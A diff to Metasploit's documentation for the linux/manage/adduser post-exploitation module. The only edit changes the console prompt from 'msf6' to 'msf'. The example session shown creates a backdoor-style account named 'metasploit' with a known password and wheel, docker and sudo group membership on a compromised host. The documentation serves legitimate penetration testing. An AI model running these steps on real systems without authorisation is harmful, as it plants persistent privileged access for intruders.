@@ -100,26 +100,26 @@ compatible with a given target.
 ## Scenarios
 
 ```
-msf6 > use post/linux/manage/adduser
-msf6 post(linux/manage/adduser) > set session 6 
+msf > use post/linux/manage/adduser
+msf post(linux/manage/adduser) > set session 6 
 session => 6
-msf6 post(linux/manage/adduser) > set sudomethod GROUP 
+msf post(linux/manage/adduser) > set sudomethod GROUP 
 sudomethod => GROUP
-msf6 post(linux/manage/adduser) > set groups wheel docker wireshark
+msf post(linux/manage/adduser) > set groups wheel docker wireshark
 groups => wheel docker wireshark
-msf6 post(linux/manage/adduser) > set username metasploit
+msf post(linux/manage/adduser) > set username metasploit
 username => metasploit
-msf6 post(linux/manage/adduser) > set password abcd1234
+msf post(linux/manage/adduser) > set password abcd1234
 password => abcd1234
-msf6 post(linux/manage/adduser) > set shell /bin/bash
+msf post(linux/manage/adduser) > set shell /bin/bash
 shell => /bin/bash
-msf6 post(linux/manage/adduser) > set home /home/metasploit
+msf post(linux/manage/adduser) > set home /home/metasploit
 home => /home/metasploit
-msf6 post(linux/manage/adduser) > set missinggroups CREATE 
+msf post(linux/manage/adduser) > set missinggroups CREATE 
 missinggroups => CREATE
-msf6 post(linux/manage/adduser) > set verbose true 
+msf post(linux/manage/adduser) > set verbose true 
 verbose => true
-msf6 post(linux/manage/adduser) > run
+msf post(linux/manage/adduser) > run
 
 [-] Groups [docker] do not exist on system
 [*] Running on Debian 11.7 (Linux 5.10.0-23-amd64)
@@ -130,7 +130,7 @@ msf6 post(linux/manage/adduser) > run
 [*] useradd --password $1$WDX5Sg4N$Hcfx4HSigx/KbvtSzhsXD/ --home-dir /home/metasploit --groups wheel,docker,wireshark,sudo --shell /bin/bash --no-log-init metasploit
 [*] 
 [*] Post module execution completed
-msf6 post(linux/manage/adduser) > run
+msf post(linux/manage/adduser) > run
 
 [*] Running on Debian 11.7 (Linux 5.10.0-23-amd64)
 [*] Useradd exists. Using that
